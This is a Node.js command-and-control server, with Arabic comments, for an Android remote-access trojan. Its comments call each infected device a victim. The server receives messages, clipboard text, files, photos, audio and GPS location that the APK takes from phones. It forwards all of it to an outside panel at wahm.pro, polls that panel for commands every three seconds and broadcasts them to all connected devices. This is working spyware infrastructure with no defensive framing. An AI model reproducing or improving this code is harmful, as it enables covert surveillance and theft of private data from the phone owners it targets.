const express = require('express');
const webSocket = require('ws');
const http = require('http');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");
const FormData = require('form-data');

// --- إعدادات المطور واهم @KHAIN3 ---
const PANEL_URL = 'https://wahm.pro/bot/control.php';
const DEVICE_ID = 'WAHM_PRO_DEVICE'; 

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appClients = new Map();

const upload = multer();
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// دالة إرسال التقارير للوحة (تعوض sendMessage في تليجرام)
async function reportToPanel(data) {
    try {
        const params = new URLSearchParams();
        for (const key in data) {
            params.append(key, data[key]);
        }
        await axios.post(PANEL_URL, params, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });
    } catch (e) {
        // فشل صامت لضمان استمرار السيرفر
    }
}

// دالة إرسال الملفات للوحة (تعوض sendDocument في تليجرام)
async function uploadFileToPanel(buffer, filename, model) {
    try {
        const form = new FormData();
        form.append('file', buffer, { filename: filename });
        form.append('model', model);
        form.append('device_id', DEVICE_ID);
        
        await axios.post(PANEL_URL, form, {
            headers: { ...form.getHeaders() }
        });
    } catch (e) {
        console.log("خطأ في رفع الملف للوحة");
    }
}

app.get('/', function (req, res) {
    res.send('<h1 align="center">تم تشغيل السيرفر بنجاح بواسطة واهم - متصل باللوحة wahm.pro</h1>');
});

// استقبال الملفات من الـ APK (الصور، الصوت، الخ)
app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname;
    const model = req.headers.model || "Unknown";
    uploadFileToPanel(req.file.buffer, name, model);
    res.send('OK');
});

// استقبال النصوص من الـ APK (الرسائل، الحافظة، الخ)
app.post("/uploadText", (req, res) => {
    const model = req.headers.model || "Unknown";
    reportToPanel({ 
        text: `جهاز [${model}]:\n${req.body['text']}` 
    });
    res.send('OK');
});

// استقبال الموقع الجغرافي
app.post("/uploadLocation", (req, res) => {
    const model = req.headers.model || "Unknown";
    reportToPanel({
        lat: req.body['lat'],
        lon: req.body['lon'],
        text: `موقع جديد من جهاز [${model}]`
    });
    res.send('OK');
});

// التعامل مع اتصالات الأجهزة (WebSocket)
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    const model = req.headers.model || "Unknown";
    const battery = req.headers.battery || "0";
    const version = req.headers.version || "0";
    const brightness = req.headers.brightness || "0";
    const provider = req.headers.provider || "Unknown";

    ws.uuid = uuid;
    ws.model = model;
    
    // تخزين بيانات العميل المتصل
    appClients.set(uuid, {
        model, battery, version, brightness, provider
    });

    // إرسال تقرير للوحة بدخول ضحية
    reportToPanel({
        text: `°• جهاز جديد متصل\n\n• الموديل: ${model}\n• البطارية: ${battery}%\n• الاندرويد: ${version}\n• السطوع: ${brightness}\n• المزود: ${provider}`
    });

    ws.on('close', function () {
        reportToPanel({ text: `°• فقد الاتصال بالجهاز: ${model}` });
        appClients.delete(ws.uuid);
    });
});

/**
 * نظام جلب الأوامر من لوحة التحكم (Polling)
 * هذا الجزء هو "المحرك" الذي يربط ضغطات أزرار اللوحة بالأجهزة
 */
setInterval(async () => {
    try {
        const response = await axios.get(`${PANEL_URL}?get_cmd=1&device_id=${DEVICE_ID}`);
        const command = response.data.trim();

        // تنفيذ الأمر إذا كان هناك أمر جديد في اللوحة
        if (command && command !== "" && command !== "OK") {
            // توزيع الأمر على كل الأجهزة المتصلة حالياً
            appSocket.clients.forEach(function each(ws) {
                if (ws.readyState === webSocket.OPEN) {
                    ws.send(command);
                }
            });
        }
    } catch (e) {
        // لا تفعل شيئاً في حالة فشل الطلب
    }
}, 3000); // يفحص الأوامر كل 3 ثواني

// المحافظة على الاتصال نشطاً
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        if (ws.readyState === webSocket.OPEN) {
            ws.send('ping');
        }
    });
}, 5000);

const PORT = process.env.PORT || 8999;
appServer.listen(PORT, () => {
    console.log(`سيرفر واهم يعمل على المنفذ ${PORT}`);
});

